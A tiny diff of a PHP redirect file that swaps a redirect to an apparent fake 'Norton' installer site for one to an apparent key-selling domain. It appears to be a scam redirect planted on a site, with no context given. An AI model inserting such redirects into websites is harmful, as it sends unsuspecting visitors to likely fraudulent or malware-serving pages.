@@ -1,4 +1,4 @@
 <?php
-header("Location: https://install-setups.website/norto/");
+header("Location: http://www.jmakeys.in/");
 die();
 ?>
